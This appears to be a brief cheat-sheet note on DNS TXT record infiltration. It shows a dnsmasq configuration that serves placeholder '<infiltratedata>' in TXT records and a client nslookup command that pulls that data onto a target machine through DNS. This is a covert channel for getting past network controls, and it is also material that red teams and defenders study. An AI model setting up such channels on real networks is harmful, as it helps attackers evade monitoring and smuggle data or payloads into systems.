----------------------------------------------
ServerSide

sudo dnsmasq -C dnsmasq.conf -d #<--- Setup a minimal DNS server enviroment following dnsmasq.conf configuration (more information in the notes) and in foreground.

#dnsmasq_txt.conf file contents

# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=<dnsmasq.confDOMAIN>
auth-server=<dnsmasq.confDOMAIN>

# TXT record
txt-record=www.<dnsmasq.confDOMAIN>,<infiltratedata>
txt-record=www.<dnsmasq.confDOMAIN>,<infiltratedata>

----------------------------------------------
ClienteSide

nslookup -type=txt www.<dnsmasq.confDOMAIN> #<---Since the nslookup is searching some subdomain on the domain configured on the dnsmasq.conf file it would receive the contents of the TXT file written above infiltrating the data on the machine.
